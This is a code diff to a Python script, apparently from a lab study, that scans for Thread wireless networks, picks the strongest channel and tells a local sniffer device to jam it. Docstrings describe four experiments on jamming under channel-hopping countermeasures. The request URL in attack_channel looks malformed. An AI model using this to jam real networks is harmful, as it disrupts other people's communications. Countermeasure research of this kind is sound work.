@@ -6,13 +6,14 @@ import os
 import sys
 import glob
 import time
+import requests
 
 SUB_STRINGS =  ["\x1b[1;32muart:~$", "\x1b[m\x1b[8D\x1b[J'", "\x1b[m']"]
 
+channel = '15' # Default value
+
 IPV4_ADDR = "10.10.10.2"
 INJECT_URL = f"http://{IPV4_ADDR}/inject.cgi"
-
-channel = '15' # Default value
 
 DEBUG = False
 
@@ -103,25 +104,29 @@ def choose_channel(networks):
     return strongest_channel[0]
         
 def attack_channel(channel):
-    pass
-        
-ports = get_ports()
-thread_device = link_device(ports)
-networks = get_open_networks(thread_device)
-channel = choose_channel(networks)
-
-# TODO: setup function to set opensniffer to attack a given channel
+    r = requests.get(f"https://{IPV4_ADDR}.test.cgi?chn={channel}&mode=1&modul=0&txlevel=0")
 
 """
-get ports
-thread_device = link devices
-Poll State every 5 seconds
-Once state != detached or disabled and is a valid state...
-MAIN LOOP - run every n seconds
-Nordic Board:
- - Run scan command
- - If any thread networks present get what channel they are on
- Open Sniffer:
- - Run attack on given channel
- - When channel is updated switch to that channel
+This function covers the first two experiments:
+Experiment 1: Jamming Thread Network on single radio Channel with no Countermeasure
+Experiment 2: Jamming Thread Network on single radio Channel with Simple Countermeasure - one channel hop, jammer doesn't rescan
 """
+def single_scan_jamming():
+    ports = get_ports()
+    thread_device = link_device(ports)
+    networks = get_open_networks(thread_device)
+    channel = choose_channel(networks)
+    attack_channel(channel)
+
+"""
+This function covers the second two experiments:
+Experiment 3: Jamming Thread Network on single radio Channel with more complex Countermeasure deployed - continuous channel hopping capability, with attacker able to rescan.
+Experiment 4: Jamming Thread Network on single radio Channel with complex Countermeasure deployed - channel hopping and duplication, with attacker able to rescan (but still only able to jam one channel at a time).
+"""
+def multiple_scan_jamming():
+    while True:
+        ports = get_ports()
+        thread_device = link_device(ports)
+        networks = get_open_networks(thread_device)
+        channel = choose_channel(networks)
+        attack_channel(channel)
